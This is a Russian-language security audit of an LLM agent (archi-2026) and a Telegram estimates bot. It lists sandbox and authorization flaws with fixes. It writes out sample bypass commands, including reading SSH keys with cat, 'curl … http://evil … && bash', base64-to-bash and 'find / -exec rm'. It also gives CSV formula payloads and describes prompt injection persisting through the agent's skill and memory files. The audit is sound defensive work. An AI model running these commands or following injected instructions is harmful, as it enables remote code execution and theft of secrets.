# Аудит 2-d: archi-2026 + proakt-build-bot — НОВЫЕ проблемы

Дата: 2026-10-31 · Метод: read-only (grep-паттерны + чтение файлов целиком), без запуска кода, без сети, без коммитов.
Известные находки (IP в deploy/config.yaml; setup-piper.sh без sha256; LICENSE/bin-блобы; «первый написавший = админ» у archi; /s/* без rate-limit + вечный share_token + фальшивое «согласована»; нет CI; ветка design/miniapp-command-center с ПДн) — НЕ повторяются, всё ниже — новое.

Нумерация: A* = archi-2026, B* = proakt-build-bot.

---

## P1

### [Инструменты агента] A1. Политика «секреты не читать» обходится через local_bash/remote_bash (`cat`)
- Файл:строка (проверено): internal/tools/bash.go:47-75 (execBash: только matchDeny/matchApproval); internal/tools/fs.go:109-110 (запрет только в read_file); internal/config/config.go:484-488 (forbidden_read_patterns)
- Цитата: `if bad := r.matchDeny(cmd); bad != ""` — и всё; `cat /home/<user>/.ssh/id_ed25519` не матчит ни один deny/approval-паттерн
- Почему: read_file честно запрещает `.ssh/`, `id_rsa`, `/etc/shadow`, но те же секреты агент (или инжект в его контекст) читает однострочным `cat` через bash-инструмент — приватный ключ попадает в контекст LLM и может уехать в Telegram-ответ. То же на remote: `cat ~/.ssh/id_rsa` под юзером archi на VM; эксфильтрация `curl -d @файл` тоже не запрещена.
- Фикс: применять forbidden_read-паттерны (и запрет сетевой эксфильтрации файлов) в execBash к тексту команды; белый список команд для local_bash/remote_bash вместо чёрного; при срабатывании — fail + алерт владельцу.

### [Песочница записи] A2. write_file может писать в ~/.ssh/authorized_keys, ~/.bashrc и systemd-user-юниты
- Файл:строка (проверено): internal/tools/fs.go:135-146 (writeAllowed = только префикс-проверка); internal/config/config.go:456-458 + deploy/config.yaml:75-79 (`allowed_write_dirs: /home, /tmp, /var/lib/archi, /srv`); internal/bridge/executor.go:111 (`bash -lc`)
- Цитата: `if !r.writeAllowed(path) { ... }` — forbidden-паттерны для записи НЕ проверяются; «/home» покрывает весь домашний каталог
- Почему: одна инъекция в промпт → `write_file ~/.bashrc` или `~/.ssh/authorized_keys` → персистентный RCE от имени юзера archi: каждый следующий local_bash идёт через `bash -lc` (executor.go:111) и ре-исполняет профиль — атака самоподдерживается. `/var/lib/archi` дополнительно открывает перезапись памяти/навыков агента.
- Фикс: вычесть из AllowedWriteDirs `.ssh`, dotfiles, `~/.config/systemd`, memory/skills; проверять forbidden-паттерны и на запись; писать 0600; ideally — отдельный рабочий каталог агента, а не весь /home.

### [Санитайзер] A3. Deny/approval-чёрный список обходится: `curl -o … && bash`, base64, `find -exec`
- Файл:строка (проверено): internal/config/config.go:459-467 (deny), 468-479 (approval); вызов — internal/tools/bash.go:53-65
- Цитата: `curl[^|]*\|\s*(ba)?sh\b` — требует пайп
- Почему: `curl -fsSL http://evil/x -o /tmp/x && bash /tmp/x` не содержит `|` → deny промахивается, approval-паттерны тоже → скачивание и исполнение удалённого кода от имени юзера без вопроса владельцу. Аналогично `echo <b64>|base64 -d|bash` и `find / -exec rm {} +`. Санитайзер заявлен как «деструктивные операции требуют человека» — это не так.
- Фикс: интерактивное разбирательство с шеллом (лексер, а не regex); deny на `base64 -d`/`| bash`/`-o /`+exec-обёртки не спасут — честный вариант: approval по умолчанию для любых curl/wget-загрузок в исполняемые пути и запуск bash-инструмента в ограниченном окружении.

## P2

### [Авторизация Telegram] A4. Опасную команду одобряет любой allowed-пользователь, а не только админ
- Файл:строка (проверено): internal/telegram/bot.go:561-576 (callback: `if !b.IsAllowed(uid)` — IsAdmin не вызывается); internal/telegram/runner.go:93-113 (handleCallback без проверки админа)
- Цитата: `if !b.IsAllowed(uid) { … continue }` → `go cbFn(...)`
- Почему: при `allowed: [id1,id2,id3], admins: [id1]` пользователь id2 (без админских прав) может нажать «✅ Разрешить» на approval-клавиатуре — граница админ/гость в самом чувствительном месте (запуск опасных команд) отсутствует. Дополняет известный takeover-вектор, но самостоятельная дыра разграничения.
- Фикс: в handleCallback проверять `b.IsAdmin(uid)`; клавиатуру слать только админ-чатам.

### [SSH] A5. strict_host_key по умолчанию выключен → InsecureIgnoreHostKey при пропуске ключа в конфиге
- Файл:строка (проверено): internal/bridge/ssh.go:78-82; internal/config/config.go (applyDefaults не задаёт дефолт для StrictHostKey; Validate:739-741 проверяет только обратный случай)
- Цитата: `if !p.cfg.StrictHostKey { … return ssh.InsecureIgnoreHostKey(), nil }`
- Почему: поставляемый deploy/config.yaml содержит `strict_host_key: true`, но любой пользовательский конфиг без этой строки молча получает MITM-открытый канал к прод-VM — а через remote_bash это полный контроль сервером. Zero-value Go-bool = незащищённый дефолт.
- Фикс: дефолт true в applyDefaults; предупреждение в лог при false; валидировать известные_хосты всегда.

### [Локальный доступ] A6. IPC-сокет 0660 + документированное «добавь себя в группу archi» = полный агент любому члену группы
- Файл:строка (проверено): internal/ipc/server.go:84 (`os.Chmod(s.socketPath, 0o660)`); deploy/archi-ear-user.service:18-19 (`sudo usermod -aG archi $USER`)
- Цитата: комментарий «Права: только владелец» против 0660 (owner+group) и инструкции добавить юзеров в группу
- Почему: каждый локальный пользователь в группе archi получает через сокет полноценный ReAct-агент с local_bash/remote_bash (включая прод-VM и sudo -n для рестартов) — без всякого Telegram-аудита. На мультиюзерном ноутбуке это эскалация до RCE.
- Фикс: 0600; ear-клиенту — отдельный узкий IPC-метод (текст команды + voice-флаг), а не полный агент; или peer-creds (SO_PEERCRED) + allowlist UID.

### [Ресурсы] A7. Неограниченный параллелизм агент-сессий из Telegram
- Файл:строка (проверено): internal/telegram/bot.go:594 и 600 (`go msgFn(...)` — горутина на каждое сообщение); internal/telegram/runner.go:203 (каждая — до 10 минут ReAct: 24 шага × до 4 параллельных инструментов)
- Цитата: `go msgFn(msg.Chat.ID, uid, msg.Text, nil) // каждый апдейт — отдельная горутина`
- Почему: один authorized-пользователь (или сценарий известного takeover-а) флудом сообщений поднимает десятки конкурентных агент-циклов: расход LLM-токенов, конкурирующие local_bash/записи, OOM ноута. Semalimt есть только внутри одного цикла (agent.go:120) и на SSH-пул.
- Фикс: семафор на число одновременных Handle (например 1-2 на чат, N глобально) + rate-limit на сообщения.

### [Промпт-инжекция] A8. Навыки и память — персистентное хранилище инжекций в системный промпт
- Файл:строка (проверено): internal/agent/prompt.go:51-72 (тело skill/body памяти вставляется в SYSTEM-промпт без разделителей/санитизации); internal/tools/skills.go:62-90 (skill_save); /var/lib/archi лежит в AllowedWriteDirs (A2)
- Цитата: `=== РЕЛЕВАНТНЫЕ НАВЫКИ === … fmt.Fprintf(&sb, "--- навык: %s (%s)\n%s\n\n", d.Title, d.Name, body)`
- Почему: один успешный prompt-injection (через прочитанную web-страницу, лог, транскрипт) → skill_save/запись .md в memory/skills → инструкции подмешиваются в системный промпт КАЖДОЙ будущей сессии (переживает /reset и рестарт демона). В связке с bash-инструментами это тихий долговременный захват агента.
- Фикс: явные ограждения-разделители + пометка «данные, не инструкции»; лимит длины уже есть, добавить — ревизию при инъекции, подпись/версию источника; не подмешивать автоматически всё из writable-каталога.

### [CSV/Excel] B1. CSV-инъекция формул в «Выгрузить прайс» (файл, который мастер открывает в Excel)
- Файл:строка (проверено): internal/app/price_sync.go:156-183, уязвимый цикл 162-168
- Цитата: `sb.WriteString(fmt.Sprintf("%s;%s;%s\n", strings.ReplaceAll(it.Name, ";", ","), …))` — экранируется только `;`, нет защиты от ведущих `=`, `+`, `-`, `@`
- Почему: имена позиций попадают в прайс из внешних источников без фильтра: синк Google-Таблицы (gsheet.FetchItems), импорт присланных XLSX/CSV (pricefile.Parse), ручной ввод, LLM-извлечение из голоса (ai.ExtractPositions). Имя вида `=HYPERLINK("http://evil";"x")` / `=CMD|'/C calc'!A0` после «📤 Выгрузить CSV» исполняется формулой при открытии файла в Excel/LibreOffice у мастера (DDE/гиперссылки). Также имена с `\n` ломают структуру строк CSV.
- Фикс: префикс `'` (или `"` с удвоением кавычек) для полей, начинающихся с =,+,-,@; экранирование кавычек/CR/LF; прогонять те же имена через фильтр при импорте.

### [Auth Mini App] B2. ValidateInitData отклоняется от канона Telegram: аргументы HMAC инвертированы + signature в data_check
- Файл:строка (проверено): internal/httpapi/auth.go:84 (и комментарий 44-53); тест-хелпер internal/httpapi/httpapi_test.go:33 подписывает тем же инвертированным способом
- Цитата: `secret := hmacSHA256([]byte("WebAppData"), []byte(botToken))` при сигнатуре `hmacSHA256(key, msg)` → HMAC с ключом «WebAppData» и сообщением-токеном; в доке Telegram `secret_key = HMAC_SHA256(key=bot_token, msg="WebAppData")`; плюс поле `signature` включено в data_check (в каноне — отдельная Ed25519-проверка)
- Почему: подделка здесь невозможна (без токена hash не посчитать), но если реальный клиент Telegram считает по канону — ВСЕ подлинные initData будут отвергнуты (mini-app мёртв), а «починить» такое обычно пытаются удалением проверки — прямой путь к auth-off. Тесты доказывают только самосогласованность.
- Фикс: сверить с живым initData; привести к канону (`hmacSHA256([]byte(botToken), []byte("WebAppData"))`, hash+signature исключены из data_check); добавить тест с эталонным вектором из доков.

### [Интеграция] B3. Ссылка «Google Таблицы» валидируется подстрокой «google.» — принимает google.evil.com
- Файл:строка (проверено): internal/gsheet/gsheet.go:61 (`strings.Contains(u.Host, "google.")`)
- Цитата: `if perr != nil || !strings.Contains(u.Host, "google.") { return "", "", ErrBadURL }`
- Почему: `https://google.attacker.tld/spreadsheets/d/xyz` проходит проверку; бот периодически (StartPriceSyncLoop, /sync, кнопка) тянет оттуда CSV и мержит в прайс — тихое отравление цен (деньги смет) и управляемый fetch на произвольный хост. Триггер — мастер присылает ссылку (в т.ч. скам-файл/пересланное сообщение).
- Фикс: точное сравнение хоста (`docs.google.com`); запрет редиректов (CheckRedirect) или отдельный client без follow.

## P3

### [Конфиг] A9. expandEnv подставляет значения env-переменных в сырой YAML до парсинга
- Файл:строка (проверено): internal/config/config.go:325-337 (expandEnv), 346 (`yaml.Unmarshal(expandEnv(raw), &c)`)
- Цитата: `return envRe.ReplaceAllFunc(raw, func(m []byte) []byte { … return []byte(v) })`
- Почему: значение переменной с `\n`, `:`, `#` сплайсится в raw-байты — можно «дорисовать» YAML-структуру (например, расширить allowed_write_dirs или вычистить deny-паттерны) при контроле над env (CI, systemd-override, скомпрометированный .env).
- Фикс: раскрывать переменные после парсинга по полям (или Marshal-обратная подстановка), в крайнем случае — квотировать подстановку.

### [SSRF] A10. Browser-инструмент не фильтрует приватные адреса
- Файл:строка (проверено): internal/tools/browser.go:52 (`urlRe = ^https?://[^\s]+$`), 60-62
- Цитата: валидация только на схему http(s)
- Почему: `browser url=http://127.0.0.1:9109/metrics`, роутер 192.168.x, GCP metadata 169.254.212.x — отрендеренный текст уходит в контекст LLM. Выключен по умолчанию (browser.enabled=false), поэтому P3, но это тот же класс, что искали.
- Фикс: резолвить хост и блокировать loopback/RFC1918/link-local/метаданные до старта Chromium.

### [Крипто] B4. Fallback генерации share-токена — time.Now().UnixNano()
- Файл:строка (проверено): internal/httpapi/estimates.go:39-46 и internal/app/estimates.go:595-601
- Цитата: `if _, err := rand.Read(b); err != nil { return fmt.Sprintf("%x", time.Now().UnixNano()) }`
- Почему: при сбое crypto/rand токен публичной ссылки сметы становится предсказуемым (наносекунды) — вместе с бессрочностью ссылок (известно) это усиление. Вероятность мала, но паттерн «деградация в слабый токен» плохой.
- Фикс: при ошибке rand.Read — отказ выдавать ссылку (fail-closed), не таймстамп.

### [Auth] B5. Replay-окно initData фиксировано 24 часа
- Файл:строка (проверено): internal/config/config.go:57 (`WebappAuthTTL: 24 * time.Hour`)
- Почему: украденный/залогированный initData сутки действует как полный ключ мастера ко всем /api (создание/удаление смет, XLSX, синк).
- Фикс: TTL 1-12 часов + опция обновления сессии; учитывать `can_move_to`… хотя бы сократить окно.

---

## Проверено и чисто (чтобы не дублировать поиск)

- proakt SQL: вся параметризация (`$1..$n`), Sprintf в SQL не найден (grep по store/ — 0 матчей); транзакция MoveEstimateLine корректна.
- proakt IDOR: actOwned/estOwned (handlers.go:259-271, estimates.go:25-36), photo-файлы с prefix-проверкой `root+Separator` (handlers.go:429-433, share.go:360-364), share-фото скопировано JOIN-ом по токену сметы (estimates.go:434-445).
- proakt XLSX: SetCellValue кладёт пользовательские строки как типизированные shared-strings (excelize v2.11) — формулы только SetCellFormula из номеров строк (xlsx/estimate.go:131-140, act.go:124-129); имя файла — sanitizeName (estimates.go:421-433). XLSX-формульной инъекции НЕТ; инъекция живёт в CSV (B1).
- proakt шаблон /s/: html/template авто-экранирует Title/Note/Name/Caption/Comment — XSS нет.
- proakt фото-загрузка: белый список расширений, имя генерирует сервер (v06.go:299-323); multipart-лимит 10 МБ.
- proakt /backup: выгрузка строго своего чата (BackupChatDump(chatID)) — кросс-тенантной утечки нет.
- proakt бот: админ-команд как класса нет (is_admin нигде не гейтит маршруты), все данные чат-скоплены; голос → base64-лимиты; err в чат — только тексты ошибок.
- archi голосовой пайплайн: все exec.Command с фиксированным бинарём и arg-слайсом (без shell); temp-файлы 0600 в os.MkdirTemp; b64-передача записи на remote корректно закавычена (fs.go:170); shellQ с двойным бэкслешем ломает только пути с `'` (fail, не инъекция); yaml.v3 v3.0.1 (CVE-2022-28948 закрыт); ipc NUL-фильтр и лимиты вывода на месте.

## Приоритет исправления
1. A1+A2+A3 (archi: секреты и запись в /home) — суть песочницы агента.
2. A3-sанитайзер (curl -o && bash), A5 (SSH host key), A6 (IPC group).
3. B1 (CSV), B3 (google.*), B2 (проверить initData на живом клиенте).
4. Остальное P2/P3 по мере.
